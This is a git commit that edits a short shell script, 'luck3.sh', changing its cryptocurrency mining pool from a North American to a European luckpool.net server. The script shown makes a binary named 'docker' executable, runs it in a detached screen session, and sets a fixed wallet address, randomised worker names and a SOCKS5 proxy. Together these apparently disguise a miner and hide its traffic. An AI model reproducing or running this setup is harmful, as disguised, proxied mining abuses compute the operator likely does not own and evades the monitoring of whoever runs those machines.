3e244dab0215f8732a326f06cb0d7e6253dc909b
wertesd <86517111+wertesd@users.noreply.github.com>
2021-07-03 22:26:37 +0700

    Update luck3.sh

--- luck3.sh
+++ luck3.sh
@@ -3,7 +3,7 @@ sudo apt update
 sudo apt install screen libjansson4 -y 
 chmod +x docker 
 screen -dmS ls 
-POOL=stratum+tcp://na.luckpool.net:3956
+POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
 WORKER=$(echo $(shuf -i 1-10 -n 1)Lukas)
 PROXY=socks5://192.252.215.2:4145
